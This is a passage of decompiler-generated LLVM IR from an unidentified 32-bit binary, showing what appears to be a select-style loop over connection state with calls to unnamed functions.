  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_8051c88()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_8051d42(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp142, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_80520f0()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_8051a81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_8051570(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_805214e()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp143, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543a4.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_8051590()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543a4.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_8051590()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
